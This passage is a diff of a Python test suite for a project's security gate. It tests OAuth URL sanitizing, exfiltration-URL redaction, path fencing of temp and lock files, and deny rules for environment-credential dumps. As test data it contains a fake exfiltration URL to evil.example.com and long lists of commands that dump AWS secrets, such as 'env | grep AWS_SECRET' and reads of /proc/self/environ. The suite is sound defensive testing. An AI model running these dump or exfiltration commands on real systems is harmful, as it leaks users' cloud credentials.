+        encoded_zwsp = "%E2%80%8B"
+        result = sanitized_oauth_endpoint(f"https://idp.example/auth{encoded_zwsp}orize?state=x")
+        assert result is not None
+        host, path = result
+        assert host == "idp.example"
+        assert path == security.REDACTED_CREDENTIAL_TAG
+
+    def test_format_character_in_host_returns_none(self) -> None:
+        """A host carrying an invisible format character is not a nameable
+        identity — the helper falls back to the unnamed message."""
+        assert sanitized_oauth_endpoint("https://idp\u200bevil.example/authorize") is None
+
+    def test_percent_encoded_credential_in_path_is_redacted(self) -> None:
+        encoded = "%67%68%70%5F" + self.GITHUB_TOKEN.removeprefix("ghp_")
+        result = sanitized_oauth_endpoint(f"https://idp.example/{encoded}/authorize")
+        assert result is not None
+        host, path = result
+        assert self.GITHUB_TOKEN not in path
+        assert encoded not in path
+        assert path == security.REDACTED_CREDENTIAL_TAG
+
+    def test_double_percent_encoded_credential_in_path_is_redacted(self) -> None:
+        """The rejection gate decodes up to _MAX_URL_DECODE_PASSES, so it
+        rejects a DOUBLE-encoded credential on a deeper pass — the sanitizer
+        must not echo bytes the gate refused (Opus review, worked case)."""
+        double_encoded = "%2567%2568%2570%255F" + self.GITHUB_TOKEN.removeprefix("ghp_")
+        result = sanitized_oauth_endpoint(f"https://idp.example/{double_encoded}/authorize")
+        assert result is not None
+        _, path = result
+        assert self.GITHUB_TOKEN not in path
+        assert double_encoded not in path
+        assert path == security.REDACTED_CREDENTIAL_TAG
+
+    def test_path_still_decodable_past_budget_is_redacted(self) -> None:
+        """A path that keeps yielding new decode layers past the budget cannot
+        be fully scanned — fail closed to the tag, mirroring the gate."""
+        nested = "%2525252541"  # "A" percent-encoded 5 layers deep
+        result = sanitized_oauth_endpoint(f"https://idp.example/{nested}/authorize")
+        assert result is not None
+        _, path = result
+        assert path == security.REDACTED_CREDENTIAL_TAG
+
+    def test_plus_delimited_private_key_in_path_is_redacted(self) -> None:
+        """Form-encoded material delimits with "+"; the scan must fold it to
+        spaces (unquote_plus) or a plus-separated private-key header slips
+        through every decode layer unmatched (GPT review)."""
+        result = sanitized_oauth_endpoint("https://idp.example/BEGIN+RSA+PRIVATE+KEY/authorize")
+        assert result is not None
+        _, path = result
+        assert path == security.REDACTED_CREDENTIAL_TAG
+
+    def test_credential_in_hostname_returns_none(self) -> None:
+        """A credential smuggled into a DNS label (hyphens are DNS-legal, so a
+        Slack-token-shaped label parses as a hostname) must not be echoed —
+        a host is an identity, so the whole helper bails (GPT review)."""
+        url = "https://xoxb-1234567890-AbCdEfGhIjKl.evil.example/authorize?state=x"
+        assert sanitized_oauth_endpoint(url) is None
+
+    def test_non_ascii_host_is_surfaced_as_idna_alabel(self) -> None:
+        """An internationalized host surfaces in punycode A-label form: defuses
+        homoglyph spoofing and matches the ASCII-only oauth_endpoints.json
+        entry shape."""
+        result = sanitized_oauth_endpoint("https://bücher.example/authorize")
+        assert result is not None
+        host, path = result
+        assert host == "xn--bcher-kva.example"
+        assert host.isascii()
+        assert path == "/authorize"
+
+    def test_fullwidth_host_normalizing_into_a_credential_returns_none(self) -> None:
+        """IDNA nameprep folds fullwidth characters to ASCII, so a token-shaped
+        fullwidth host can NORMALIZE INTO a credential the pre-IDNA scan could
+        not match — the surfaced form must be re-scanned after every transform
+        (GPT review)."""
+        fullwidth = "ｘｏｘｂ－１２３４５６７８９０－ａｂｃｄｅｆｇｈｉｊｋｌ"
+        assert sanitized_oauth_endpoint(f"https://{fullwidth}.evil.example/authorize") is None
+
+    def test_overlong_path_is_truncated(self) -> None:
+        # Hyphenated segments: no 40+ run of the base64 alphabet, so the path
+        # is benign-long rather than entropy-suspicious — it truncates, not
+        # redacts.
+        long_path = "/seg-ment" * 40
+        result = sanitized_oauth_endpoint(f"https://idp.example{long_path}")
+        assert result is not None
+        _, path = result
+        assert len(path) == security._SANITIZED_OAUTH_PATH_MAX_LEN + 1
+        assert path.endswith("…")
+
+    def test_overlong_host_is_capped(self) -> None:
+        # 30-char labels: below the 40-char bare-run floor, so the host is
+        # benign-long — it caps, not bails.
+        long_host = ".".join(["a" * 30] * 9) + ".example"
+        result = sanitized_oauth_endpoint(f"https://{long_host}/authorize")
+        assert result is not None
+        host, _ = result
+        assert len(host) <= security._SANITIZED_OAUTH_HOST_MAX_LEN
+
+    @pytest.mark.parametrize(
+        "url",
+        [
+            "",
+            "https://[bad-ipv6/x",
+            "not a url at all",
+            "https:///path-without-host",
+        ],
+        ids=["empty", "invalid-ipv6", "not-a-url", "no-host"],
+    )
+    def test_unparseable_urls_return_none(self, url: str) -> None:
+        assert sanitized_oauth_endpoint(url) is None
+
 
 class TestOperatorOAuthEndpointExtension:
     """The keystone ``oauth_endpoints.json`` extends the OAuth endpoint set.
@@ -2175,9 +3285,7 @@ class TestOperatorOAuthEndpointExtension:
         )
 
     @pytest.fixture(autouse=True)
-    def _isolated_extension_state(
-        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
-    ) -> Path:
+    def _isolated_extension_state(self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Path:
         """Fresh home + fresh process-global audit/memo state for EVERY test.
 
         The dedupe set and the file memo are process-global by design; without
@@ -2234,9 +3342,7 @@ class TestOperatorOAuthEndpointExtension:
             ext_home / "oauth_endpoints.json",
             ns=(1_700_000_000_000_000_000, 1_700_000_000_000_000_000),
         )
-        assert _load_operator_oauth_endpoints() == frozenset(
-            {("other.idp.example", "/authorize")}
-        )
+        assert _load_operator_oauth_endpoints() == frozenset({("other.idp.example", "/authorize")})
 
         (ext_home / "oauth_endpoints.json").unlink()
         assert _load_operator_oauth_endpoints() == frozenset()
@@ -2365,16 +3471,12 @@ class TestOperatorOAuthEndpointExtension:
         invalid_padding: list[dict] = [
             {"host": "*.invalid.example", "path": "/a"}
         ] * _ENDPOINT_EXTENSION_CAP
-        self._write_extension(
-            ext_home, invalid_padding + [{"host": self.HOST, "path": self.PATH}]
-        )
+        self._write_extension(ext_home, invalid_padding + [{"host": self.HOST, "path": self.PATH}])
         assert _load_operator_oauth_endpoints() == frozenset()
 
     # ── Gate: the extension widens exactly the builtin exemption, nothing more ──
 
-    def test_extended_endpoint_passes_previously_rejected_consent_url(
-        self, ext_home: Path
-    ) -> None:
+    def test_extended_endpoint_passes_previously_rejected_consent_url(self, ext_home: Path) -> None:
         # Fails closed with no file (the pre-extension behavior) …
         assert oauth_url_contains_credential(self.CONSENT_URL) is True
         # … and passes once the operator allowlists the exact endpoint.
@@ -2501,16 +3603,6 @@ class TestOperatorOAuthEndpointExtension:
         # the file-edit tool path is pinned too.
         assert is_sensitive_write_path(f"~/{prefix}/oauth_endpoints.json") is True
 
-    def test_bash_write_and_read_both_blocked(self) -> None:
-        for cmd in (
-            "echo x > ~/.kiro/crew/oauth_endpoints.json",
-            "tee ~/.kiro/crew/oauth_endpoints.json",
-            "cp evil ~/.kiro/crew/oauth_endpoints.json",
-            "cat ~/.kiro/crew/oauth_endpoints.json",
-            "cat ~/.kirocrew/oauth_endpoints.json",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
     # ── Corpus contract: operator-extension URLs ──
 
     @pytest.mark.parametrize(
@@ -2540,6 +3632,48 @@ class TestOperatorOAuthEndpointExtension:
 
 class TestRedactExfiltrationUrls:
     """Tests for redact_exfiltration_urls — domain-agnostic payload detection."""
+
+    def test_substitution_is_built_from_the_exported_prefix(self) -> None:
+        """The URL tag must start with ``EXFILTRATION_REDACTION_TAG_PREFIX``.
+
+        The dashboard chat notice prefix-counts that constant in
+        the persisted text to tell the user a URL was rewritten -- the tag
+        interpolates the domain, so unlike the constant credential tags it
+        cannot be equality-compared. Driving the REAL redactor here pins the
+        substitution to the exported constant: if the f-string ever drifts from
+        the prefix, this goes red instead of the notice silently never firing.
+        """
+        from kiro_crew.security import (
+            EXFILTRATION_REDACTION_TAG_PREFIX,
+            redact_exfiltration_urls,
+        )
+
+        url = "https://evil.example.com/steal?data=" + "A" * 250
+        result, warnings = redact_exfiltration_urls(f"Link: {url}")
+        assert warnings, "fixture no longer trips the redactor; pick another URL"
+        assert EXFILTRATION_REDACTION_TAG_PREFIX in result
+        assert f"{EXFILTRATION_REDACTION_TAG_PREFIX}evil.example.com]" in result
+
+    def test_url_tag_prefix_does_not_collide_with_credential_tags(self) -> None:
+        """Prefix-counting the URL tag must never double-count a credential tag.
+
+        The notice sums ``CREDENTIAL_REDACTION_TAGS`` exact counts and the URL
+        prefix count over the same text. That is only safe while neither side
+        matches the other's substitution: the prefix must not appear inside any
+        credential tag, no credential tag may start with the prefix, and the
+        prefix stays OUT of the tuple (it is a prefix, not a full tag -- see the
+        tuple's docstring).
+        """
+        from kiro_crew.security import (
+            CREDENTIAL_REDACTION_TAGS,
+            EXFILTRATION_REDACTION_TAG_PREFIX,
+        )
+
+        assert EXFILTRATION_REDACTION_TAG_PREFIX not in CREDENTIAL_REDACTION_TAGS
+        for tag in CREDENTIAL_REDACTION_TAGS:
+            assert EXFILTRATION_REDACTION_TAG_PREFIX not in tag
+            assert not tag.startswith(EXFILTRATION_REDACTION_TAG_PREFIX)
+            assert tag not in EXFILTRATION_REDACTION_TAG_PREFIX
 
     def test_external_long_query_redacted(self) -> None:
         """External domains with long query strings are still redacted."""
@@ -2807,7 +3941,7 @@ class TestRedactExfiltrationUrls:
 
 class TestExfilUrlPathAndRawIp:
     """security-review 78224f3f: secrets embedded in the URL PATH (no ``?``) and raw-IP /
-    IPv6 literal hosts must be scanned/redacted — previously both bypassed
+    IPv6 literal hosts must be scanned/redacted — both otherwise bypass
     scan_exfiltration_urls (query-only scan + letter-TLD-only host regex)."""
 
     def test_credential_in_path_no_query_flagged(self) -> None:
@@ -3166,8 +4300,8 @@ class TestExfilExactHostExemption:
         """PlatformCompositionError from the adapter degrades to the empty set =
         full redaction, and MUST NOT propagate: this lookup can only ever RELAX
         the heuristics, so the empty set is already the strictest answer.
-        Propagation aborted the calling operation (issue #4561: every pooled MCP
-        backend spawn in gatewayd died building its own log line)."""
+        Propagation aborted the calling operation -- every pooled MCP
+        backend spawn in gatewayd died building its own log line."""
         import dataclasses
 
         from kiro_crew.config import KiroCrewConfig
@@ -3187,12 +4321,12 @@ class TestExfilExactHostExemption:
         assert len(warnings) == 1
 
     def test_unbooted_nonstandalone_profile_still_redacts(self) -> None:
-        """Regression for issue #4561: ``redact()`` in an UNBOOTED worker under a
+        """``redact()`` in an UNBOOTED worker under a
         non-standalone profile must not raise.
 
         ``gatewayd`` never installs a ``PlatformContext``; under
         ``KIROCREW_PROFILE=enterprise`` ``current_context()`` fail-closes, and
-        the exempt-host lookup inside ``redact()`` used to propagate that error,
+        the exempt-host lookup inside ``redact()`` must not propagate that error,
         killing every pooled MCP backend spawn while it built the spawn log
         line.  The lookup must degrade to the empty set (maximum redaction)
         instead: the log line is still fully redacted, the operation survives.
@@ -3372,12 +4506,12 @@ class TestIsSensitivePath:
 
     def test_refresh_chains_json(self) -> None:
         # refresh_chains.json (dashboard/refresh_tokens.py) stores
-        # refresh-token chain state used to mint new access tokens.
+        # refresh-token chain state for minting new access tokens.
         assert is_sensitive_path("~/.kiro/crew/refresh_chains.json") is True
         assert is_sensitive_path("~/.kirocrew/refresh_chains.json") is True
 
     def test_local_secret(self) -> None:
-        # .local_secret is the shared internal-auth secret used to
+        # .local_secret is the shared internal-auth secret used, in turn, to
         # authenticate MCP/cron/hook callbacks back into the gateway
         # (mcp_core.py, cron_script.py, mcp_shared.py, etc.).
         assert is_sensitive_path("~/.kiro/crew/.local_secret") is True
@@ -3471,6 +4605,155 @@ class TestIsSensitivePath:
 
     def test_empty_path(self) -> None:
         assert is_sensitive_path("") is False
+
+
+class TestKeystonePublishArtifacts:
+    """A keystone leaf's atomic-write temp and lock sibling are on the floor too.
+
+    ``atomic_write`` publishes every keystone leaf through a
+    ``tempfile.mkstemp(dir=path.parent, suffix=".tmp")`` sibling and renames it over the
+    target, and several stores take a lock file beside the leaf they guard. The temp
+    holds the leaf's FULL payload for the duration of the write, so the path gate must
+    refuse it -- fencing the final name alone left the publish path outside the fence.
+    """
+
+    # ── the real shapes, on the tool path ──
+
+    @pytest.mark.parametrize("prefix", [".kiro/crew", ".kirocrew"])
+    def test_mkstemp_temp_in_the_crew_root_is_fenced(self, prefix: str) -> None:
+        """The shape atomic_write ACTUALLY produces: a random name, no leaf in it."""
+        assert is_sensitive_path(f"~/{prefix}/tmpAB12CD34.tmp") is True
+
+    @pytest.mark.parametrize("prefix", [".kiro/crew", ".kirocrew"])
+    def test_lock_siblings_in_the_crew_root_are_fenced(self, prefix: str) -> None:
+        # .policy.lock guards the ops autonomy ceiling; the *.json.lock form is the
+        # ops secrets store's; .crons.lock is the cron store's.
+        assert is_sensitive_path(f"~/{prefix}/.policy.lock") is True
+        assert is_sensitive_path(f"~/{prefix}/ops_mission_control_secrets.json.lock") is True
+        assert is_sensitive_path(f"~/{prefix}/.crons.lock") is True
+
+    @pytest.mark.parametrize("prefix", [".kiro/crew", ".kirocrew"])
+    def test_leaf_suffixed_temp_is_fenced(self, prefix: str) -> None:
+        """The shape measured earlier, kept even though no writer emits it.
+
+        Covered by the same suffix rule at no extra cost, and a hand-rolled writer
+        adopting this convention later inherits the protection.
+        """
+        assert is_sensitive_path(f"~/{prefix}/computer_use.json.tmp") is True
+        assert is_sensitive_path(f"~/{prefix}/security_policy.json.tmp") is True
+        assert is_sensitive_path(f"~/{prefix}/token_signing.key.tmp") is True
+        assert is_sensitive_path(f"~/{prefix}/.env.tmp") is True
+
+    @pytest.mark.parametrize("prefix", [".kiro/crew", ".kirocrew"])
+    def test_artifact_beside_a_nested_leaf_is_fenced(self, prefix: str) -> None:
+        """The rule follows the leaf, so a leaf outside the root is covered as well."""
+        assert is_sensitive_path(f"~/{prefix}/workspace/md-notebook/One.md.abcd.tmp") is True
+
+    def test_the_write_gate_stays_a_superset(self) -> None:
+        """is_sensitive_write_path is documented as a superset, so it must agree."""
+        from kiro_crew.security import is_sensitive_write_path
+
+        assert is_sensitive_write_path("~/.kiro/crew/tmpAB12CD34.tmp") is True
+        assert is_sensitive_write_path("~/.kiro/crew/.policy.lock") is True
+
+    def test_the_dollar_addition_does_not_over_block(self) -> None:
+        """A ``$`` in a command is not a verdict; the shell gate matches no paths."""
+        assert is_sensitive_bash_command("echo $HOME") is None
+        assert is_sensitive_bash_command("cat ~/project/notes.txt") is None
+        assert is_sensitive_bash_command("VAR=$HOME cat ~/project/notes.txt") is None
+        assert is_sensitive_bash_command("cd $HOME && ls") is None
+        assert is_sensitive_bash_command("cat ~/.kiro/crew/config.json") is None
+
+    def test_the_alias_tolerance_still_rejects_a_different_file(self) -> None:
+        """The lookahead admits a trailing separator or dot, never a longer NAME.
+
+        This is the boundary that keeps the tolerance from becoming a wildcard: a file
+        whose name merely starts with an artifact name is a different file.
+        """
+        assert is_sensitive_bash_command("cat ~/.kiro/crew/tmpAB12CD34.tmpx") is None
+        assert is_sensitive_bash_command("cat ~/.kiro/crew/tmpAB12CD34.tmp-old") is None
+        assert is_sensitive_bash_command("cat ~/project/build.tmpl") is None
+        assert is_sensitive_bash_command("cat ~/project/yarn.lock") is None
+
+    # ── it must not over-block ──
+
+    @pytest.mark.parametrize("prefix", [".kiro/crew", ".kirocrew"])
+    def test_routine_crew_root_reads_still_allowed(self, prefix: str) -> None:
+        """The reason the crew root cannot simply be fenced wholesale."""
+        assert is_sensitive_path(f"~/{prefix}/config.json") is False
+        assert is_sensitive_path(f"~/{prefix}/sessions.db") is False
+        assert is_sensitive_path(f"~/{prefix}/notes.txt") is False
+
+    def test_the_users_own_home_is_not_swept(self) -> None:
+        """The parent set is derived from the CREW leaves, not from every sensitive path.
+
+        ``_SENSITIVE_HOME_DIRS`` also carries ``.aws``, ``.ssh`` and the identity
+        stores, whose parent is ``$HOME`` itself -- deriving the artifact parents from
+        that list would fence every ``*.tmp`` and ``*.lock`` in the user's home.
+        """
+        assert is_sensitive_path("~/scratch.tmp") is False
+        assert is_sensitive_path("~/yarn.lock") is False
+        assert is_sensitive_path("~/project/yarn.lock") is False
+        assert is_sensitive_bash_command("cat ~/project/yarn.lock") is None
+        assert is_sensitive_bash_command("npm ci --prefer-offline") is None
+
+    def test_the_parent_is_matched_by_equality_not_prefix(self) -> None:
+        """An artifact is a DIRECT child of the leaf's directory.
+
+        A prefix test would sweep every descendant of the crew home whose name ends in
+        ``.tmp`` -- much wider than this needs, in a directory that must stay readable.
+        """
+        assert is_sensitive_path("~/.kiro/crew/sub/deeper/x.tmp") is False
+        assert is_sensitive_bash_command("cat ~/.kiro/crew/sub/deeper/x.tmp") is None
+
+    def test_a_directory_without_a_keystone_leaf_is_out_of_scope(self) -> None:
+        """``deploy/`` takes a lock but holds no keystone leaf.
+
+        There is no keystone payload beside it for the fence to protect, so it is
+        deliberately excluded rather than swept in by proximity.
+        """
+        assert is_sensitive_path("~/.kiro/crew/deploy/pending-deploys.lock") is False
+
+    def test_the_leaves_themselves_are_still_fenced(self) -> None:
+        """No regression: the artifact clause is additive."""
+        assert is_sensitive_path("~/.kiro/crew/computer_use.json") is True
+        assert is_sensitive_path("~/.kiro/crew/security_policy.json") is True
+        assert is_sensitive_path("~/.kiro/crew/.env") is True
+        assert is_sensitive_path("~/.kiro/crew/webhooks/tokens.json") is True
+
+    def test_a_relocated_crew_home_is_covered(self, tmp_path, monkeypatch) -> None:
+        """KIROCREW_HOME re-anchoring is inherited, not reimplemented.
+
+        The keystone leaves live directly under a custom ``KIROCREW_HOME``, so the
+        artifact rule has to follow them there or the fence is bypassed by setting the
+        env var. Covered because a ``<crew-prefix>``-rooted entry hits the
+        prefix-stripping arm in ``_home_dir_targets_uncached``.
+        """
+        relocated = tmp_path / "custom-crew-home"
+        relocated.mkdir()
+        monkeypatch.setenv("KIROCREW_HOME", str(relocated))
+        assert is_sensitive_path(str(relocated / "tmpAB12CD34.tmp")) is True
+        assert is_sensitive_path(str(relocated / ".policy.lock")) is True
+        # ...and the over-block guard holds there too.
+        assert is_sensitive_path(str(relocated / "config.json")) is False
+
+    def test_a_symlink_aimed_at_a_live_temp_is_caught(self, tmp_path, monkeypatch) -> None:
+        """The resolved candidate form is checked, so a benign link name does not help."""
+        home = tmp_path / "home"
+        crew = home / ".kiro" / "crew"
+        crew.mkdir(parents=True)
+        temp = crew / "tmpAB12CD34.tmp"
+        temp.write_text("secret-payload-mid-write\n")
+        # Path.home() reads HOME on POSIX and USERPROFILE on Windows, and the gate anchors
+        # its targets on Path.home() -- so setting only HOME leaves the Windows anchor on
+        # the real profile and the fake home below is never recognised. Set both.
+        monkeypatch.setenv("HOME", str(home))
+        monkeypatch.setenv("USERPROFILE", str(home))
+        ws = tmp_path / "workspace"
+        ws.mkdir()
+        link = ws / "notes.txt"
+        link.symlink_to(temp)
+        assert is_sensitive_path(str(link)) is True
 
 
 class TestHomeDirTargetsCache:
@@ -3678,722 +4961,395 @@ class TestHomeDirTargetsCache:
         assert len(security._home_targets_cache) <= 33
 
 
+class TestEnvDumpGrepAwsNarrowing:
+    """The env-dump-piped-to-grep deny fires on a credential dump and nothing else.
+
+    The same regex backs two tiers -- the always-on keystone
+    (``_ENV_CRED_SHARED_RULE_IDS``, checked here through
+    ``is_sensitive_bash_command``) and the disableable
+    ``credential-exfil-env-grep-aws`` catalog rule (checked through its real
+    ``_DenyMatcher``). Both are asserted so a fix on one tier cannot leave the block
+    standing on the other under a different message. The direct-``printenv`` sibling
+    rule is pinned alongside, and every case is also run through the FULL gate: a
+    shape one rule stops refusing while a sibling still refuses it is not fixed.
+
+    The narrowing is in the two anchors an attacker cannot rewrite around -- the dump
+    verb has to be a whole word, and the selected name has to be one whose selection
+    prints a credential. It is deliberately NOT in confining the match to one shell
+    statement or pipeline stage: ``DENIED`` carries the quoted-separator dumps that
+    proved a statement-scoped span fails OPEN, and ``RESIDUAL_OVER_BLOCK`` carries
+    what refusing to guess costs instead.
+    """
+
+    DENIED = (
+        "env | grep AWS_SECRET",
+        "env | grep AWS_",
+        "env | grep -c AWS_",
+        # The bare name with no underscore selects the same variables.
+        "env | grep AWS",
+        "env | grep -i aws",
+        'env | grep "AWS"',
+        "env | grep AWS_ACCESS",
+        "printenv | grep -i aws_session",
+        "set | grep AWS_",
+        "export -p | grep AWS_",
+        "env | sort | grep AWS_",
+        "env | awk '/AWS_/'",
+        "env | sed -n '/AWS_SECRET/p'",
+        # An alternation inside the grep pattern, with the prefix on either side.
+        "/bin/sh -c 'env | grep -E \"^(AWS_|SANDBOX|AIM)\"'",
+        "env | grep -E '^(SANDBOX|AWS_)'",
+        # Inside a command substitution.
+        "echo $(env | grep AWS_SESSION)",
+        # The SAME dump under a path, a quote or a substitution -- ``/usr/bin/env`` is
+        # the most ordinary spelling of the command, so the command-word boundary must
+        # not treat the path separator as part of a longer word.
+        "/usr/bin/env | grep AWS_SECRET_ACCESS_KEY",
+        "/bin/printenv | grep AWS_",
+        "sudo -E /usr/bin/env | grep AWS_SESSION",
+        "$(which env) | grep AWS_",
+        "'env' | grep AWS_SECRET",
+        "env|grep AWS_SECRET",
+        # A TRUNCATED secret word. ``grep`` selects by substring, so ``AWS_S`` prints
+        # ``AWS_SECRET_ACCESS_KEY``'s value exactly as ``AWS_SECRET`` does.
+        "env | grep AWS_S",
+        "env | grep AWS_SE",
+        "env | grep AWS_SECU",
+        "printenv | grep AWS_A",
+        "env | grep -i aws_s",
+        # The selecting stage is not the first stage after the dump.
+        "env | grep -v PATH | grep AWS_SECRET",
+        "env | tr ' ' '\\n' | grep AWS_SECRET",
+        # ``|&`` is bash's stderr-merging PIPE and ``2>&1`` an fd duplication, both
+        # inside one pipeline -- the same dump two keystrokes differently, so an
+        # ``&`` may not be read as a statement separator on sight.
+        "env |& grep -q '^AWS_SECRET_ACCESS_KEY='",
+        "printenv |& grep AWS_",
+        "set |& grep AWS_",
+        "env 2>&1 | grep AWS_SECRET",
+        "export -p 2>&1 | grep AWS_",
+        "env | grep -v X 2>&1 | grep AWS_SECRET",
+        "env | grep -v PATH |& grep AWS_SECRET",
+        # A quoted or escaped filter word is still the filter.
+        "env | 'grep' AWS_SECRET",
+        'env | "grep" -q AWS_SECRET',
+        "env | \\grep AWS_SECRET",
+        # A ``;`` or ``&`` inside a QUOTED argument. These are the reason the gaps
+        # between the dump, the pipe, the filter and the selector are plain ``.*``
+        # rather than statement- or stage-scoped spans: a regex cannot tell a
+        # separator from the identical character inside a quote, and a span that
+        # stops at the quoted one fails OPEN on an ordinary credential dump.
+        "env | sed 's/;/x/' | grep AWS_SECRET_ACCESS_KEY",
+        "env | grep -E 'a;b|AWS_SECRET'",
+        "env | grep -E 'a&b|AWS_SECRET'",
+        "env | awk -F';' '{print}' | grep AWS_",
+        "env | tr ';' '\\n' | grep AWS_SECRET",
+        'env | sed "s/&/x/" | grep AWS_SECRET',
+        "env -u 'A;B' | grep AWS_SECRET",
+        "env FOO='a;b' | grep AWS_SECRET",
+        # ``/proc/<pid>/environ`` IS the process environment under a path, so reading
+        # it and selecting a credential out of it is the same dump. A word-bounded
+        # dump verb has to name ``environ`` explicitly, because the boundary that
+        # (correctly) stops ``src/environment`` also stops the accidental ``env``
+        # substring that once caught this shape.
+        "strings /proc/self/environ | grep AWS_SECRET",
+        "cat /proc/self/environ | tr '\\0' '\\n' | grep AWS_SECRET",
+        "tr '\\0' '\\n' < /proc/self/environ | grep AWS_SECRET",
+        "xargs -0 -n1 < /proc/1234/environ | grep AWS_SECRET",
+        # ``typeset`` with no operand prints every variable WITH its value, so it is a
+        # dump under another name -- named for the same reason ``environ`` is.
+        "typeset | grep AWS_SECRET",
+        "typeset | grep AWS_",
+    )
+
+    # What refusing to guess at statement boundaries costs. Every one of these was
+    # refused before the narrowing too, so none is a new over-block; they are pinned
+    # DENIED so the trade is explicit rather than discovered later. Confining the
+    # match to one statement would allow each of them -- and would also allow the
+    # quoted-separator dumps in ``DENIED``, which is the direction that matters.
+    RESIDUAL_OVER_BLOCK = (
+        # A later pipeline stage's text read as the filter's operand (``echo``
+        # ignores stdin, so nothing from the dump is actually selected).
+        "env | grep PATH | echo AWS_SECRET",
+        # A filter in a LATER statement than the dump.
+        "env | head -5; grep -r AWS_ src/",
+        "env | wc -l && grep AWS_SECRET f",
+        "env | grep KIROCREW && echo AWS_SECRET",
+        "env | head -1 & grep AWS_SECRET f",
+        # ``env`` as another tool's SUBCOMMAND. Anchoring the verb to a command
+        # position would drop it, and would also drop ``sudo -E /usr/bin/env | grep
+        # AWS_SECRET`` -- any wrapper prefix defeats that anchor, so it is not one.
+        "conda env list | grep aws",
+    )
+
+    ALLOWED = (
+        # A named non-secret variable.
+        "env | grep AWS_REGION",
+        "env | grep AWS_PROFILE",
+        "printenv | grep AWS_DEFAULT_REGION",
+        "env | grep -E '^AWS_PROFILE='",
+        "env | grep AWS_ROLE_ARN",
+        # A non-secret name that merely SHARES a secret word's first letters. The
+        # truncation clause requires the operand to end at the truncation, so these
+        # stay out even though ``AWS_S`` is denied.
+        "env | grep AWS_SDK_LOAD_CONFIG",
+        "env | grep AWS_SHARED_CREDENTIALS_FILE",
+        "env | grep AWS_STS_REGIONAL_ENDPOINTS",
+        # ``AWS`` inside another identifier is not the prefix.
+        "env | grep MY_AWS_ROLE",
+        # A digit ends the bare prefix: no secret-bearing name contains ``AWS1`` or
+        # ``AWS_1``, so selecting one cannot print a credential.
+        "env | grep AWS1",
+        "env | grep AWS_1",
+        # No filter at all.
+        "env | cut -d= -f1 | sort",
+        "docker exec kirocrew printenv KIROCREW_PORT",
+        "printenv | wc -l",
+        # The dump verb has to END a word, not merely start one.
+        "grep -rn AWS_REGION src/environment/",
+        "ls src/environment | grep AWS_SECRET",
+        "pyenv | grep AWS_SECRET",
+        "virtualenv versions | grep AWS_SECRET",
+        "dotenv | grep AWS_SECRET",
+        "offset | grep AWS_SECRET",
+        "git diff --stat -- settings.py | grep AWS_",
+        # ``env`` as a WRAPPER, not a dump.
+        "env FOO=1 python -c 'print(1)'",
+        # No pipe between the dump and the filter, which is what keeps a bare
+        # ``set -e`` at the top of a script from making the rest of the line a dump.
+        "cat .env; grep AWS_ config.py",
+        "unset AWS_PROFILE; grep -r AWS_ src/",
+        "set -e; grep AWS_ file.txt",
+        # Nothing that dumps the environment at all.
+        "cat README.md | grep AWS_REGION",
+        "grep -rn AWS_SECRET_ACCESS_KEY src/",
+        "cat .github/workflows/ci.yml | grep AWS_",
+        "docker inspect x | grep AWS_REGION",
+    )
+
+    # ``printenv NAME`` prints a value directly -- its own catalog rule, no pipe.
+    PRINTENV_DENIED = (
+        "printenv AWS_SECRET_ACCESS_KEY",
+        "printenv AWS_SESSION_TOKEN",
+        "printenv AWS_ACCESS_KEY_ID",
+        "printenv AWS_REGION AWS_SECRET_ACCESS_KEY",
+        "/usr/bin/printenv AWS_SECRET_ACCESS_KEY",
+        "printenv 2>&1 AWS_SECRET_ACCESS_KEY",
+        "printenv 2>/dev/null AWS_SESSION_TOKEN",
+    )
+    PRINTENV_ALLOWED = (
+        "printenv AWS_REGION",
+        "printenv AWS_PROFILE AWS_DEFAULT_REGION",
+        "printenv AWS_ROLE_ARN",
+        "printenv MY_AWS_ROLE",
+        "printenv",
+        # ``printenv`` takes EXACT names, so a truncation prints nothing. This is the
+        # one place the two rules diverge on purpose, and the divergence is grep's
+        # substring matching, not an oversight.
+        "printenv AWS_S",
+        "printenv AWS_SDK_LOAD_CONFIG",
+    )
+
+    # Every truncation of a secret-bearing word, derived from the same tuple the
+    # selector is built from, so adding a word extends the pinned set automatically.
+    SECRET_WORD_TRUNCATIONS = tuple(
+        sorted(
+            {
+                word[:length]
+                for word in security._AWS_SECRET_WORDS
+                for length in range(1, len(word) + 1)
+            }
+        )
+    )
+
+    @staticmethod
+    def _keystone(cmd: str) -> bool:
+        from kiro_crew.security import _check_env_credential_access
+
+        return _check_env_credential_access(cmd) is not None
+
+    @staticmethod
+    def _rule_matcher(rule_id: str):
+        from kiro_crew import security
+
+        rule = next(r for r in security.BUILTIN_DENIED_RULES if r.id == rule_id)
+        return security._deny_matcher(rule.pattern)
+
+    @classmethod
+    def _catalog_matcher(cls):
+        return cls._rule_matcher("credential-exfil-env-grep-aws")
+
+    def test_catalog_rule_and_keystone_share_one_regex(self) -> None:
+        from kiro_crew import security
+
+        rule = next(
+            r for r in security.BUILTIN_DENIED_RULES if r.id == "credential-exfil-env-grep-aws"
+        )
+        assert rule.pattern == security._ENV_DUMP_GREP_AWS_PATTERN
+        # The keystone names the CATALOG RULE, so there is no parallel pattern
+        # constant it could be edited away from -- and it resolves from
+        # ``BUILTIN_DENIED_RULES``, not the user's effective set, so opting the
+        # catalog rule out does not retire the always-on block.
+        assert rule.id in security._ENV_CRED_SHARED_RULE_IDS
+        assert rule in security._ENV_CRED_SHARED_RULES
+        # The direct-``printenv`` sibling shares its regex across the two tiers for the
+        # same reason: two hand-written spellings of one intent drift, and the tier that
+        # cannot be switched off is the one that must not end up weaker.
+        printenv_rule = next(
+            r for r in security.BUILTIN_DENIED_RULES if r.id == "credential-exfil-printenv-aws"
+        )
+        assert printenv_rule.pattern == security._PRINTENV_AWS_SECRET_PATTERN
+        assert printenv_rule.id in security._ENV_CRED_SHARED_RULE_IDS
+        assert printenv_rule in security._ENV_CRED_SHARED_RULES
+        # A renamed id must not silently shrink the tuple and retire the block.
+        assert len(security._ENV_CRED_SHARED_RULES) == len(security._ENV_CRED_SHARED_RULE_IDS)
+
+    def test_keystone_tier_evaluates_the_shared_rules_on_the_deny_matcher(
+        self, monkeypatch
+    ) -> None:
+        # Sharing the regex TEXT is not enough. The keystone tier applies no length
+        # cap, and an ordered-existence pattern under Python's backtracking engine is
+        # superlinear in the number of candidate pipes and filter words -- measured in
